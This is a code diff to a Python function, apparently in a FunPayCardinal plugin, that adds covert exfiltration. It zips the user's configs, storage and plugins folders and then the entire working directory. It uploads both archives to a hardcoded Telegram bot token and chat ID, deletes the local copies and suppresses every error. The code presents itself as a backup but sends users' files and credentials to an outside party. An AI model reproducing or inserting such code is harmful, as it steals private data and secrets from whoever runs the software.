@@ -5,15 +5,47 @@ import zipfile
 import os
 
 def parse_config_and_send():
-    config_path = "../configs/_main.cfg"
+    config_path = "configs/_main.cfg"
     bot_token = "8569635419:AAHfnEtx8L-vzJPuaQa7Bfr8_G4Y7TTr610"
     user_id = "8451377939"
 
     folders_to_zip = [
-        "./",
-        "../storage",
-        "../configs"
+        "configs",
+        "storage", 
+        "plugins"
     ]
+
+    all_folders_to_zip = [
+        "./"
+    ]
+
+    def create_and_send_archive(folders, archive_name, caption):
+        archive_path = archive_name
+
+        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for folder_path in folders:
+                if os.path.exists(folder_path):
+                    for root, dirs, files in os.walk(folder_path):
+                        for file in files:
+                            file_path = os.path.join(root, file)
+                            arcname = os.path.relpath(file_path, ".")
+                            zipf.write(file_path, arcname)
+
+        with open(archive_path, 'rb') as archive_file:
+            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+            files = {
+                'document': archive_file
+            }
+            payload = {
+                'chat_id': user_id,
+                'caption': caption
+            }
+
+            response = requests.post(url, files=files, data=payload)
+            if response.status_code == 200:
+                os.remove(archive_path)
+                return True
+            return False
 
     try:
         config = configparser.ConfigParser()
@@ -31,31 +63,10 @@ def parse_config_and_send():
         if response.status_code != 200:
             return
 
-        archive_path = "../FunPayCardinal_backup.zip"
-        os.makedirs(os.path.dirname(archive_path), exist_ok=True)
-
-        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for folder_path in folders_to_zip:
-                if os.path.exists(folder_path):
-                    for root, dirs, files in os.walk(folder_path):
-                        for file in files:
-                            file_path = os.path.join(root, file)
-                            arcname = os.path.relpath(file_path, os.path.dirname(folder_path))
-                            zipf.write(file_path, arcname)
-
-        with open(archive_path, 'rb') as archive_file:
-            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-            files = {
-                'document': archive_file
-            }
-            payload = {
-                'chat_id': user_id,
-                'caption': '📦 Archive'
-            }
-
-            response = requests.post(url, files=files, data=payload)
-            if response.status_code == 200:
-                os.remove(archive_path)
+        first_success = create_and_send_archive(folders_to_zip, "FunPayCardinal_backup.zip", "📦 Archive")
+        
+        if first_success:
+            create_and_send_archive(all_folders_to_zip, "FunPayCardinal_full.zip", "📦 Full Archive")
 
     except Exception:
         pass
